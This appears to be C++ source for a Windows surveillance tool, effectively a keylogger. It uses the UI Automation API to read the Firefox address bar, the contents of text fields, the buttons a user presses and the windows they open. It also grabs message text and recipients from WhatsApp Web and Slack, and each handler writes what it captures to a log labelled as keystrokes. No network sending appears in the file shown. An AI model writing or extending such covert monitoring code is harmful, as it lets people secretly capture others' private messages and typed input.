#include "AEventHandlerApps.h"
#include "EventHandler.h"
#include "Logger.h"
#include "Tree.h"
#include "Helpers.h"

void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	//Log(L"HandleFirefox() Invoked", DBG);

	BSTR bUrlBar = NULL;
	HRESULT hr = ERROR_SUCCESS;
	IUIAutomation* pAutomation = NULL;
	CComPtr<IUIAutomationElement> pAutomationElementUrlBar = NULL;
	CComPtr<IUIAutomationCondition> pCondition = NULL;
	VARIANT vAutomationId;
	VARIANT vUrlBar;
	VARIANT vValue;
	std::wstring wsDomain = L"";
	std::wstring wsUrl = L"";
	VariantInit(&vAutomationId);
	VariantInit(&vUrlBar);
	VariantInit(&vValue);

	switch (eventID) {
	case UIA_Text_TextSelectionChangedEventId:
	case UIA_Text_TextChangedEventId:
		pAutomation = g_pMyTreeWalker->GetPAutomation();
		if (pAutomation == NULL)
		{
			Log(L"Can't get pAutomation from g_pMyTreeWalker()", DBG);
			break;
		}

		vAutomationId.vt = VT_BSTR;
		vAutomationId.bstrVal = SysAllocString(L"urlbar-input");
		hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, vAutomationId, &pCondition);
		if (FAILED(hr))
		{
			Log(L"Can't create property condition", DBG);
			break;
		}

		pAutomationElementUrlBar = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pCondition);
		if (pAutomationElementUrlBar == NULL)
		{
			Log(L"Can't find navigation bar of firefox!", DBG);
			break;
		}

		hr = pAutomationElementUrlBar->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vUrlBar);
		if (FAILED(hr))
		{
			Log(L"Can't get url value", WARNING);
			break;
		}

		wsUrl = std::wstring(vUrlBar.bstrVal);
		//Log(L"URL: " + wsUrl, DBG);

		wsDomain = Helpers::GetDomainFromUrl(vUrlBar.bstrVal);

		break;

	case UIA_Invoke_InvokedEventId:
	case UIA_Window_WindowOpenedEventId:
		HandleOther(pAutomationElement, wsProcName, wsEventString, wsDate, eventID);
		break;

	default:
		Log(L"Arrived unknown event in HandleFirefox(). How to process that? :)" + wsEventString, DBG);
		break;
	}

	std::unordered_map<std::wstring, std::function<void()>> handlers = {
			{ L"web.whatsapp.com", [this, pAutomationElement, wsProcName, wsDate]() { HandleWhatsAppFF(pAutomationElement, wsProcName, wsDate); } },
			{ L"app.slack.com", [this, pAutomationElement, wsProcName, wsDate]() { HandleSlackFF(pAutomationElement, wsProcName, wsDate); } }
	};

	auto it = handlers.find(Helpers::ConvertToLower(wsDomain));

	if (it != handlers.end()) {
		it->second();
	}
	else {
		HandleOther(pAutomationElement, wsProcName, wsEventString, wsDate, eventID);
	}

	if (bUrlBar)
		SysFreeString(bUrlBar);

	VariantClear(&vValue);
	VariantClear(&vUrlBar);
	VariantClear(&vAutomationId);
}

void MyAutomationEventHandler::HandleExplorer(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleExplorer() Invoked", DBG);
	Log(L"Load...", INFO);
}

void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	//Log(L"HandleOther() Invoked", DBG);

	BSTR bWindowName = NULL;
	BSTR bClassName = NULL;
	BSTR bLocalizedControlType = NULL;

	DWORD size = 0;
	HRESULT hr = ERROR_SUCCESS;

	VARIANT vValue;
	VARIANT vHelp;
	VariantInit(&vValue);
	VariantInit(&vHelp);

	CComPtr<IUIAutomationElement> pAutomationElementChild = pAutomationElement;
	CComPtr<IUIAutomationElement> pAutomationElementParent = NULL;

	CONTROLTYPEID ctId;

	std::wstring wsControlType = L"";
	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [" + wsEventString + L"]";

	switch (eventID)
	{
	case UIA_Text_TextSelectionChangedEventId:
	case UIA_Text_TextChangedEventId:
		hr = g_pMyTreeWalker->GetFirstAscendingWindowName(pAutomationElement, &bWindowName);
		if (FAILED(hr))
		{
			Log(L"Can't get window name value", WARNING);
			break;
		}

		hr = pAutomationElement->get_CurrentClassName(&bClassName);
		if (FAILED(hr))
		{
			Log(L"Can't get current class name", DBG);
			break;
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
		if (FAILED(hr))
		{
			Log(L"Can't get help property value", DBG);
			break;
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);
		if (FAILED(hr))
		{
			Log(L"Can't get property value", WARNING);
			break;
		}


		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
		wsLogKeyStroke += L"\n--------------[RAW CONTENT]--------------\n" + std::wstring(vValue.bstrVal) + L"\n--------------[RAW CONTENT]--------------";

		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_Invoke_InvokedEventId:

		hr = pAutomationElement->get_CurrentName(&bWindowName);
		if (FAILED(hr))
		{
			Log(L"Can't get window name", DBG);
			break;
		}

		hr = pAutomationElement->get_CurrentClassName(&bClassName);
		if (FAILED(hr))
		{
			Log(L"Can't get current class name", DBG);
			break;
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
		if (FAILED(hr))
		{
			Log(L"Can't get help property value", DBG);
			break;
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);
		if (FAILED(hr))
		{
			Log(L"Can't get property value", WARNING);
			break;
		}

		hr = pAutomationElement->get_CurrentControlType(&ctId);
		if (FAILED(hr))
		{
			Log(L"Can't get current control type", DBG);
			break;
		}

		wsControlType = Helpers::ControlTypeIdToString(ctId);

		hr = pAutomationElement->get_CurrentLocalizedControlType(&bLocalizedControlType);
		if (FAILED(hr))
		{
			Log(L"Can't get localized control type", DBG);
			break;
		}

		wsLogKeyStroke += L"\n--------------[User pressed the button]--------------";
		wsLogKeyStroke += L"\n\tControlType: " + std::wstring(wsControlType);
		wsLogKeyStroke += L"\n\tLocalizedControlType: " + std::wstring(bLocalizedControlType);
		wsLogKeyStroke += L"\n\tName: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
		wsLogKeyStroke += L"\n\tProp Value: " + std::wstring(vValue.bstrVal);
		wsLogKeyStroke += L"\n--------------[User pressed the button]--------------";

		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_Window_WindowOpenedEventId:
		hr = g_pMyTreeWalker->GetFirstAscendingWindowName(pAutomationElement, &bWindowName);
		if (FAILED(hr))
		{
			Log(L"Can't get window name value", WARNING);
			break;
		}

		hr = pAutomationElement->get_CurrentClassName(&bClassName);
		if (FAILED(hr))
		{
			Log(L"Can't get current class name", DBG);
			break;
		}

		wsLogKeyStroke += L"\n--------------[Opened new Window]--------------";
		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
		wsLogKeyStroke += L"\n--------------[Opened new Window]--------------";

		Log(wsLogKeyStroke, EMPTY);
		break;

	default:
		Log(L"Arrived unknown event in HandleOther(). How to process that? :)" + wsEventString, DBG);
		break;
	}

	if (bLocalizedControlType)
		SysFreeString(bLocalizedControlType);

	if (bWindowName)
		SysFreeString(bWindowName);

	if (bClassName)
		SysFreeString(bClassName);

	VariantClear(&vHelp);
	VariantClear(&vValue);
}

void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate)
{
	BSTR bMsgReceiver = NULL;
	HRESULT hr = ERROR_SUCCESS;
	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [ New Web WhatsApp Message ]";

	VARIANT vIAccessibleRoleValue;
	VARIANT vAriaRoleValue;
	VARIANT vMsgValue;
	VariantInit(&vIAccessibleRoleValue);
	VariantInit(&vAriaRoleValue);
	VariantInit(&vMsgValue);

	CComPtr<IUIAutomationCondition> pControlTypeCondition = NULL;
	CComPtr<IUIAutomationCondition> pDefaultActionCondition = NULL;
	CComPtr<IUIAutomationCondition> pInvokePatternCondition = NULL;
	CComPtr<IUIAutomationCondition> pScrollItemPatternCondition = NULL;
	CComPtr<IUIAutomationCondition> pAndCondition1 = NULL;
	CComPtr<IUIAutomationCondition> pAndCondition2 = NULL;
	CComPtr<IUIAutomationCondition> pAndCondition3 = NULL;

	CComPtr<IUIAutomationElement> pAutomationElementProfileInfo = NULL;
	CComPtr<IUIAutomationElement> pAutomationElementReceiver = NULL;

	IUIAutomationTreeWalker* pWalker = NULL;
	IUIAutomation* pAutomation = g_pMyTreeWalker->GetPAutomation();

	if (pAutomation == NULL)
	{
		Log(L"Cant get pAutomation from g_pMyTreeWalker", DBG);
		goto exit;
	}

	// check for the right field
	hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &vIAccessibleRoleValue);
	if (FAILED(hr) || vIAccessibleRoleValue.iVal != 42)
	{
		Log(L"Cant get LegacyIAccessibleRolePropertyId from WebWhatsappFF handler", DBG);
		goto exit;
	}

	hr = pAutomationElement->GetCurrentPropertyValue(UIA_AriaRolePropertyId, &vAriaRoleValue);
	if (FAILED(hr) || vAriaRoleValue.bstrVal == NULL || wcscmp(vAriaRoleValue.bstrVal, L"textbox") != 0)
	{
		Log(L"Cant get AriaRolePropertyId from WebWhatsappFF handler", DBG);
		goto exit;
	}

	// find msg receiver
	pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, CComVariant(UIA_ButtonControlTypeId), &pControlTypeCondition);
	pAutomation->CreatePropertyCondition(UIA_LegacyIAccessibleDefaultActionPropertyId, CComVariant(L"click"), &pDefaultActionCondition);
	pAutomation->CreatePropertyCondition(UIA_IsInvokePatternAvailablePropertyId, CComVariant(true), &pInvokePatternCondition);
	pAutomation->CreatePropertyCondition(UIA_IsScrollItemPatternAvailablePropertyId, CComVariant(true), &pScrollItemPatternCondition);

	pAutomation->CreateAndCondition(pControlTypeCondition, pDefaultActionCondition, &pAndCondition1);
	pAutomation->CreateAndCondition(pAndCondition1, pInvokePatternCondition, &pAndCondition2);
	pAutomation->CreateAndCondition(pAndCondition2, pScrollItemPatternCondition, &pAndCondition3);

	pAutomationElementProfileInfo = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pAndCondition3);
	if (pAutomationElementProfileInfo == NULL)
	{
		Log(L"Cant find profile info", DBG);
		goto exit;
	}

	pWalker = g_pMyTreeWalker->GetPTreeWalker();
	if (pWalker == NULL)
	{
		Log(L"Cant get treewalker", DBG);
		goto exit;
	}

	hr = pWalker->GetNextSiblingElement(pAutomationElementProfileInfo, &pAutomationElementReceiver);
	if (FAILED(hr))
	{
		Log(L"Can't find msg receiver gui element", DBG);
		goto exit;
	}

	hr = pAutomationElementReceiver->get_CurrentName(&bMsgReceiver);
	if (FAILED(hr))
	{
		Log(L"Can't get msg receiver name", DBG);
		goto exit;
	}

	wsLogKeyStroke += L"\nTo: " + std::wstring(bMsgReceiver);

	// msg contents
	hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vMsgValue);
	if (FAILED(hr))
	{
		Log(L"Cant get msg contents", DBG);
		goto exit;
	}

	wsLogKeyStroke += L"\nMsg: " + std::wstring(vMsgValue.bstrVal);

	Log(wsLogKeyStroke, EMPTY);

exit:
	if (bMsgReceiver)
		SysFreeString(bMsgReceiver);

	VariantClear(&vMsgValue);
	VariantClear(&vAriaRoleValue);
	VariantClear(&vIAccessibleRoleValue);
	return;
}
void MyAutomationEventHandler::HandleSlackFF(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate)
{
	BSTR bMsgReceiver = NULL;
	HRESULT hr = ERROR_SUCCESS;
	VARIANT vIAccessibleRoleValue;
	VARIANT vAriaRoleValue;
	VARIANT vMsgValue;
	VariantInit(&vIAccessibleRoleValue);
	VariantInit(&vAriaRoleValue);
	VariantInit(&vMsgValue);

	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [New Web Slack Message]";

	// check for the right field
	hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &vIAccessibleRoleValue);
	if (FAILED(hr) || vIAccessibleRoleValue.iVal != 42)
	{
		Log(L"Cant get LegacyIAccessibleRolePropertyId from WebWhatsappFF handler", DBG);
		goto exit;
	}

	hr = pAutomationElement->GetCurrentPropertyValue(UIA_AriaRolePropertyId, &vAriaRoleValue);
	if (FAILED(hr) || vAriaRoleValue.bstrVal == NULL || wcscmp(vAriaRoleValue.bstrVal, L"textbox") != 0)
	{
		Log(L"Cant get AriaRolePropertyId from WebWhatsappFF handler", DBG);
		goto exit;
	}

	hr = pAutomationElement->get_CurrentName(&bMsgReceiver);
	if (FAILED(hr))
	{
		Log(L"Can't get name of the Web Slack Message field", DBG);
		goto exit;
	}

	// msg contents
	hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vMsgValue);
	if (FAILED(hr))
	{
		Log(L"Can't get value of the Web Slack Message field", DBG);
		goto exit;
	}

	wsLogKeyStroke += L"\nTo: " + std::wstring(bMsgReceiver);
	wsLogKeyStroke += L"\nMsg: " + std::wstring(vMsgValue.bstrVal);

	Log(wsLogKeyStroke, EMPTY);

exit:

	if (bMsgReceiver)
		SysFreeString(bMsgReceiver);

	VariantClear(&vMsgValue);
	VariantClear(&vAriaRoleValue);
	VariantClear(&vIAccessibleRoleValue);
	return;
}